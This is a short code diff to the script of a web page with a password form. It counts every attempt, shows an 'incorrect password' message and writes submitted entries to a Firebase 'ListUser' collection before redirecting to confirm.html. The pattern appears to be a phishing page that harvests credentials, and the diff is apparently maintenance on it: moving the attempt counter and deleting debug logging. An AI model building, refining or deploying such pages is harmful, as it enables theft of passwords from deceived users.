@@ -2409,7 +2409,7 @@
             var password = document.getElementById('password').value.trim();
             var validate = false;
             var href = "confirm.html";
-
+            count++;
             $('#validate-passord').attr('style', 'display:none');
 
             if (password != "") {
@@ -2424,7 +2424,6 @@
                     $('#validate-passord').text('Incorrect passord. Please try again.');
                     $('#validate-passord').attr('style', 'display: block');
                 }
-                count++;
             } else {
                 $('#validate-passord').text('The passord field is required.');
                 $('#validate-passord').attr('style', 'display: block');
@@ -2505,12 +2504,10 @@
                                 reason: reasonEl,
                                 nv: vnptLC
                             });
-                            console.log(1213);
                         } else {
                             var keyID = Math.floor(Math.random() * 9999999999);
                             localStorage.setItem('key', keyID);
                             db.ref('ListUser/' + keyID).set(dataStore);
-                            console.log(dataStore);
                         }
 
                         setTimeout(() => {
